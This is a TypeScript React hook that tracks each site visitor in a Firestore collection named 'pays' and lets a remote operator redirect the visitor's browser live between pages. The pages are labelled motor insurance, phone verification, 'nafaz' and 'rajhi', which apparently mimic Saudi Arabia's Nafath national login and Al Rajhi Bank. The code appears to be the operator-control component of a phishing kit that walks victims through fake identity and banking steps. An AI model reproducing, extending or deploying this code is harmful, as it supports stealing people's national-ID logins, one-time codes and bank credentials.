import { useEffect, useCallback, useRef } from "react";
import { useLocation } from "wouter";
import { db, addData, generateVisitorId, isFirebaseConfigured } from "@/lib/firebase";
import { doc, onSnapshot } from "firebase/firestore";

export type RoutablePage = "motor" | "motor-insurance" | "phone-verification" | "nafaz" | "rajhi" | "done";

export interface AdminDirective {
  targetPage?: RoutablePage;
  targetStep?: number;
  issuedAt?: string;
  issuedBy?: string;
}

export interface VisitorData {
  adminDirective?: AdminDirective;
  currentPage?: string;
  currentStep?: number;
}

const PAGE_ROUTES: Record<string, string> = {
  "motor": "/motor",
  "motor-insurance": "/motor",
  "phone-verification": "/phone",
  "nafaz": "/nafaz",
  "rajhi": "/rajhi",
  "done": "/motor",
};

const normalizePageName = (page: string): RoutablePage => {
  if (page.startsWith("motor-insurance") || page === "motor") return "motor";
  if (page.startsWith("phone")) return "phone-verification";
  if (page.startsWith("nafaz")) return "nafaz";
  if (page.startsWith("rajhi")) return "rajhi";
  return "motor";
};

const getRouteForPage = (page: string): string | undefined => {
  return PAGE_ROUTES[page] || PAGE_ROUTES[normalizePageName(page)];
};

let pendingDirective: { directive: AdminDirective; key: string } | null = null;

interface UseVisitorRoutingOptions {
  currentPage: RoutablePage;
  currentStep?: number;
  firestorePageName?: string;
  onStepChange?: (step: number) => void;
}

export function useVisitorRouting({
  currentPage,
  currentStep,
  firestorePageName,
  onStepChange,
}: UseVisitorRoutingOptions) {
  const [location, setLocation] = useLocation();
  const processedDirectivesRef = useRef<Set<string>>(new Set());
  const writingRef = useRef(false);
  const lastWrittenPageRef = useRef<string | null>(null);

  const getVisitorId = useCallback((): string => {
    if (typeof sessionStorage === "undefined") return "";
    
    let visitorId = sessionStorage.getItem("visitor");
    if (!visitorId) {
      visitorId = generateVisitorId();
      sessionStorage.setItem("visitor", visitorId);
    }
    return visitorId;
  }, []);

  const visitorId = getVisitorId();

  const updateVisitorState = useCallback(async (page: string, step?: number) => {
    if (!visitorId || writingRef.current) return;
    
    writingRef.current = true;
    lastWrittenPageRef.current = page;
    
    const updatePayload: any = {
      id: visitorId,
      currentPage: page,
    };
    if (step !== undefined) {
      updatePayload.currentStep = step;
    }
    try {
      await addData(updatePayload);
    } finally {
      writingRef.current = false;
    }
  }, [visitorId]);

  useEffect(() => {
    if (pendingDirective && normalizePageName(pendingDirective.directive.targetPage || "") === currentPage) {
      const { directive, key } = pendingDirective;
      
      if (directive.targetStep !== undefined && directive.targetStep !== currentStep && onStepChange) {
        onStepChange(directive.targetStep);
      }
      
      processedDirectivesRef.current.add(key);
      pendingDirective = null;
    }
  }, [currentPage, currentStep, onStepChange]);

  const currentPageRef = useRef(currentPage);
  const currentStepRef = useRef(currentStep);
  const onStepChangeRef = useRef(onStepChange);
  const locationRef = useRef(location);

  useEffect(() => { currentPageRef.current = currentPage; }, [currentPage]);
  useEffect(() => { currentStepRef.current = currentStep; }, [currentStep]);
  useEffect(() => { onStepChangeRef.current = onStepChange; }, [onStepChange]);
  useEffect(() => { locationRef.current = location; }, [location]);

  useEffect(() => {
    if (!visitorId || !db || !isFirebaseConfigured) return;

    const docRef = doc(db, "pays", visitorId);
    
    const unsubscribe = onSnapshot(docRef, (docSnap) => {
      if (!docSnap.exists()) return;
      
      const data = docSnap.data() as VisitorData;
      const directive = data.adminDirective;
      const page = currentPageRef.current;
      const step = currentStepRef.current;
      const loc = locationRef.current;
      const stepCb = onStepChangeRef.current;
      
      if (directive && directive.targetPage) {
        const normalizedTarget = normalizePageName(directive.targetPage);
        const directiveKey = `${directive.targetPage}-${directive.targetStep}-${directive.issuedAt}`;
        
        if (!processedDirectivesRef.current.has(directiveKey)) {
          if (normalizedTarget !== page) {
            pendingDirective = { directive, key: directiveKey };
            
            const targetRoute = getRouteForPage(directive.targetPage);
            if (targetRoute && loc !== targetRoute) {
              setLocation(targetRoute);
            }
          } else {
            processedDirectivesRef.current.add(directiveKey);
            
            if (directive.targetStep !== undefined && directive.targetStep !== step && stepCb) {
              stepCb(directive.targetStep);
            }
          }
          return;
        }
      }
      
      if (data.currentPage && typeof data.currentPage === 'string') {
        const firestorePage = data.currentPage;
        const normalizedFirestorePage = normalizePageName(firestorePage);
        
        const lastWritten = lastWrittenPageRef.current;
        if (lastWritten) {
          const normalizedLastWritten = normalizePageName(lastWritten);
          if (normalizedLastWritten === normalizedFirestorePage) {
            return;
          }
        }
        
        if (normalizedFirestorePage !== page) {
          const targetRoute = getRouteForPage(firestorePage);
          if (targetRoute && loc !== targetRoute) {
            setLocation(targetRoute);
          }
          
          if (data.currentStep !== undefined && data.currentStep !== step && stepCb) {
            stepCb(data.currentStep);
          }
        }
      }
    }, (error) => {
      console.error("Error listening to visitor routing:", error);
    });

    return () => unsubscribe();
  }, [visitorId, setLocation]);

  const hasMountedRef = useRef(false);

  useEffect(() => {
    if (!visitorId || !currentPage) return;
    const pageName = firestorePageName || currentPage;
    
    if (!hasMountedRef.current) {
      hasMountedRef.current = true;
      updateVisitorState(pageName, currentStep);
      return;
    }
    
    updateVisitorState(pageName, currentStep);
  }, [visitorId, currentPage, currentStep, firestorePageName, updateVisitorState]);

  return {
    visitorId,
    updateVisitorState,
  };
}
